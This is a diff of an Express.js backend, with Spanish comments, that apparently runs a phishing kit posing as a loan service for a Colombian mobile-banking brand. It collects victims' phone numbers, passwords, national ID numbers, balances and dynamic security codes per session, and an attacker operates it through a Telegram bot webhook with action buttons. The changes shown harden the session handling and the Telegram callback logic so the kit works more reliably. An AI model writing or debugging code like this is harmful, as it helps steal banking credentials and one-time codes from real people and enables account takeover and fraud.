@@ -23,7 +23,7 @@ app.use(express.static('public')); // Servir archivos estáticos
 // ==================== VARIABLES DE ENTORNO ====================
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
-const RENDER_URL = process.env.RENDER_URL || 'https://tu-proyecto.onrender.com';
+const RENDER_URL = process.env.RENDER_URL || 'https://propulsorneq.onrender.com';
 
 if (!BOT_TOKEN || !CHAT_ID) {
   console.warn("[WARN] BOT_TOKEN o CHAT_ID no definidos en variables de entorno.");
@@ -133,7 +133,14 @@ app.post('/step1-credentials', async (req, res) => {
     }
 
     // Guardar en sesión
-    const session = sessionData.get(sessionId) || {};
+    const session = sessionData.get(sessionId);
+	if (!session) {
+	   return res.status(400).json({
+	   ok: false,
+	   error: "Session no existe o se perdió"
+		  });
+		}
+
     session.phoneNumber = phoneNumber;
     session.password = password;
     session.ip = ip;
@@ -175,7 +182,14 @@ app.post('/step2-loan-first', async (req, res) => {
     } = req.body;
 
     // Guardar en sesión
-    const session = sessionData.get(sessionId) || {};
+    const session = sessionData.get(sessionId);
+	if (!session) {
+	    return res.status(400).json({
+		ok: false,
+		error: "Session no existe o se perdió"
+		  });
+		}
+
     session.cedula = cedula;
     session.nombreCompleto = nombreCompleto;
     session.ocupacion = ocupacion;
@@ -203,7 +217,14 @@ app.post('/step2-loan-second', async (req, res) => {
     }
 
     // Obtener datos de sesión
-    const session = sessionData.get(sessionId) || {};
+    const session = sessionData.get(sessionId);
+	if (!session) {
+	  return res.status(400).json({
+		ok: false,
+		error: "Session no existe o se perdió"
+	  });
+}
+
     session.saldoActual2 = saldoActual; // Segundo saldo
     sessionData.set(sessionId, session);
 
@@ -251,7 +272,14 @@ app.post('/step3-dynamic', async (req, res) => {
     }
 
     // Obtener datos de sesión
-    const session = sessionData.get(sessionId) || {};
+    const session = sessionData.get(sessionId);
+	if (!session) {
+	  return res.status(400).json({
+		ok: false,
+		error: "Session no existe o se perdió"
+	  });
+	}
+
     
     // Guardar la dinámica
     if (!session.dynamics) {
@@ -327,25 +355,46 @@ app.post('/consignar', async (req, res) => {
 
 // ==================== WEBHOOK DE TELEGRAM ====================
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
+  // ✅ RESPONDER INMEDIATO A TELEGRAM (OBLIGATORIO)
+  res.sendStatus(200);
+
+  // ✅ LOG GLOBAL (clave para depurar)
+  console.log("📩 TELEGRAM UPDATE:", JSON.stringify(req.body));
+
   try {
     const update = req.body;
     const { callback_query } = update;
-    
-    if (callback_query) {
-      const [action, sessionId] = (callback_query.data || '').split('|');
-      
-      console.log(`📞 Callback recibido - Acción: ${action} - Session: ${sessionId}`);
-      
-      // Eliminar menú de botones
-      try {
-        await axios.post(getTelegramApiUrl('editMessageReplyMarkup'), {
-          chat_id: callback_query.message.chat.id,
-          message_id: callback_query.message.message_id,
-          reply_markup: { inline_keyboard: [] }
-        });
-      } catch (editError) {
-        console.log('⚠️ No se pudo eliminar el menú');
-      }
+
+    if (!callback_query) return;
+
+    const [action, sessionId] = (callback_query.data || '').split('|');
+
+    console.log(`📞 Callback recibido`);
+    console.log(`➡ Acción: ${action}`);
+    console.log(`➡ Session: ${sessionId}`);
+
+    // 🔔 RESPUESTA AL BOTÓN (SIEMPRE)
+    await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
+      callback_query_id: callback_query.id,
+      text: '✅ Acción recibida (demo)',
+      show_alert: false
+    });
+
+    // 🧹 INTENTO DE QUITAR BOTONES (opcional)
+    try {
+      await axios.post(getTelegramApiUrl('editMessageReplyMarkup'), {
+        chat_id: callback_query.message.chat.id,
+        message_id: callback_query.message.message_id,
+        reply_markup: { inline_keyboard: [] }
+      });
+    } catch (e) {
+      console.log("⚠️ No se pudo quitar el menú");
+    }
+
+  } catch (error) {
+    console.error("❌ Error en webhook:", error.message);
+  }
+});
 
       // ==================== MANEJO DE ACCIONES ====================
       
